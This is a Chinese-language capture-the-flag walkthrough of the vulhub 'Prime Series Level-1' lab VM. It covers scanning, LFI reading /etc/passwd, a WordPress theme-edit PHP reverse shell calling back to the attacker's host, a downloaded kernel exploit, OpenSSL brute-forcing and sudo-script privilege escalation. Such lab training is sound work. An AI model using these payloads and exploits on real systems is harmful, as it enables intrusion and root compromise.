---
title: vulhub-Prime_Series_Level-1
date: 2026-01-25
updated: 2026-01-25
tags:
  - vulhub
categories:
  - 安全相关
description: vulhub-Prime_Series_Level-1
---
## 环境

> - kali: 192.168.181.129
> - Prime_Series_Level-1: 192.168.181.0/24 ...

## 信息收集

```bash
# C段，搜索存活主机
nmap -sn 192.168.181.0/24

# 搜索所有端口
nmap --min-rate 1000 -p- 192.168.181.142
```

![[attachments/20260125.png]]

存在 80 http 服务和 22 ssh 服务

```bash
# 对目标端口扫描
nmap -sT -sV -sC -p22,80 192.168.181.142
```

![[attachments/20260125-1.png]]

结果显示了对应服务以及可能得操作系统及版本

```bash
# udp端口扫描
nmap -sU -p20,80 192.168.181.42
```

均关闭

![[attachments/20260125-2.png]]

```bash
# 漏扫脚本扫描
nmap --script=vuln -p22,80 192.168.181.142
```

![[attachments/20260125-5.png]]

80 http 的服务，wordpress 博客系统

```bash
# 目录扫描
dirb http://192.168.181.142
```

暴露出大量 wordpress 目录；这里的 dev 目录并不是一个常规的 wordpress 目录

![[attachments/20260125-4.png]]

访问 dev 目录下的内容，给出了一定的提示：应该深挖 web

![[attachments/20260125-7.png]]

```bash
# 指定文件来扫描并保存记录（dirb默认只扫目录）
dirb http://192.168.181.142 -X .zip,.txt -o report/dirbveryhard.txt
```

![[attachments/20260125-6.png]]

得到新的信息，尝试访问，进一步给出提示，需要进一步进行模糊测试，可以利用给出的提示链接里面的工具 wfuzz。同时提示需要查看 location.txt 文件（先留着，暂时还不知道该文件路径）

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

![[attachments/20260125-8.png]]

扫描存在的 `.php` 文件

![[attachments/20260125-9.png]]

访问，页面是一张图片

```bash
# wfuzz 进行模糊测试
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt -hh 136 http://192.168.181.142/index.php?FUZZ=xxx
# -c 显示颜色 -w 指定字典 -hh 筛选内容
# 初次扫描不需要添加筛选内容，需要根据扫描结果来筛选有价值的内容
```

得到一个 file 参数，访问但是提示正在访问错误文件

![[attachments/20260125-10.png]]

![[attachments/20260125-11.png]]

访问上面所提到的 location.txt，获得进一步提示，并访问

![[attachments/20260125-12.png]]

其他 php 页面存在 secrettier360 参数

![[attachments/20260125-13.png]]

尝试本地文件包含，得到 passwd 中的内容

![[attachments/20260125-14.png]]

存在拥有 bash 环境的用户以及文件路径提示

> 一般小于 1000 的账号都是系统用户的一些功能性账号，意义不大（除非可以直接拿到 root） 

![[attachments/20260125-15.png]]

成功得到一个用户名和密码，暂时留存（尝试 ssh 连接失败）

## 对内容管理系统扫描

回到 web 端，寻找登录后台的路径以及已经存在的漏洞

```bash
# wpscan 针对内容管理系统的扫描器
# 扫用户
wpscan -url http://192.168.181.142/wordpress -e u
# -e 指定需要的信息的参数
```

除了扫描工具，通过对原系统网页的浏览也可以搜集到一些关于用户的信息（有用户肯定有和该管理系统之间的交互行为）

![[attachments/20260125-16.png]]

有 victor 用户

wp-login.php 后台登录页面，用上方所得到的用户名和密码登录

![[attachments/20260125-17.png]]

![[attachments/20260125-18.png]]

插件上传，主题编辑一般会存在漏洞

找到可能至少具有写权限的页面，写入反弹 shell Payload

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.181.129/443 0>&1'"); ?>
```

![[attachments/20260126.png]]

监听端口成功得到 shell

![[attachments/20260126-1.png]]

saket 用户不需要密码就可以以超级管理员的权限执行 

enc 特征字符（openssl），后续可以继续探索（先记录）

得到 flag-1

![[attachments/20260126-2.png]]

![[attachments/20260126-3.png]]

enc 目前没有权限执行

查看计划任务文件，shadow 文件是否拥有读写等权限来进一步爆破/提权

## 利用系统内核提权

```bash
uname -a	# 查看系统版本号相关信息
# 搜索当前系统对应版本存在的内核漏洞提权
searchsploit Linux ubuntu 4.10.0-28
# 下载到本地
searchsploit Linux ubuntu -m 45010
```

![[attachments/20260126-4.png]]

本地编译后续靶机下载执行

```bash
# php建立服务器
php -S 0:80
```

![[attachments/20260126-5.png]]

```bash
# exp下载
wget http://192.168.181.142/45010
```

![[attachments/20260126-6.png]]

![[attachments/20260126-7.png]]

执行后报错，重新编译并运行

```bash
# 编译
gcc 45010.c -o 45010
# 得到交互式shell
python -c "import pty;pty.spawn('/bin/bash')"
```

得到 flag-2

![[attachments/20260126-8.png]]

## 提权 2

enc openssl 密码文件

```bash
find / -name '*backup*' 2>/dev/null | sort | less
# 排除错误，排序，分页查看
```

通过 find 搜索可能存在密码相关的的文件，back、backup、passwd 等，查看可能具有信息特征的路径中的文件。

![[attachments/20260309.png]]

成功找到存在 password 的文件，执行 enc 后，可以进入 saket 用户的目录查看存在的文件及相关提示信息

![[attachments/20260309-1.png]]

enc.txt，key.txt 里面的信息，可通过 openssl 解密获得进一步的信息

![[attachments/20260309-2.png]]

根据提示信息对 key 值进行计算

```bash
echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1}'
```

![[attachments/20260309-3.png]]

openssl enc 的加密解密码

```bash
# 将openssl所支持的加密类型先存到一个文件中，方便随后进行爆破
awk '{gsub(/ /,"\n");print}' CiperTypeRaw | sort | uniq > CipherTypes
```

![[attachments/20260309-4.png]]

通过查看 enc 命令加解密，-K 参数需要提供十六进制的秘钥，将得到的 key 进行转换

```bash
echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1}' | tr -d '\n' | od -A n -t x1 | tr -d '\n' | tr -d ' '
```

![[attachments/20260309-5.png]]

```bash
# 通过openssl解密，需要传入指定的解密类型和key
echo -n 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -CipherType -K 3336366137346362336339353964653137643631646233303539316333396431
```

利用刚才构建好的加解密类型进行爆破

```bash
for Cipher in $(cat CipherTypes);do echo 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -$Cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;echo $Cipher;done
```

![[attachments/20260309-6.png]]

![[attachments/20260309-7.png]]

得到密码，ssh 连接，返回交互式 shell

```bash
ssh saket@192.168.181.142
python -c "import pty;pty.spawn('/bin/bash')"
```

![[attachments/20260309-8.png]]

不需要密码可执行 `/home/victor/undefeated_victor`，但执行该文件缺少 `/tmp/challenge` 文件，那么我们手动创建，并写入 bash，赋予执行权限

```bash
echo '#!/bin/bash' > challenge
echo '/bin/bash' >> challenge
```

由于 `/home/victor/undefeated_victor` 是高权限执行的，那么它所执行 challenge 时也是高权限，因此可以成功提权。

![[attachments/20260309-9.png]]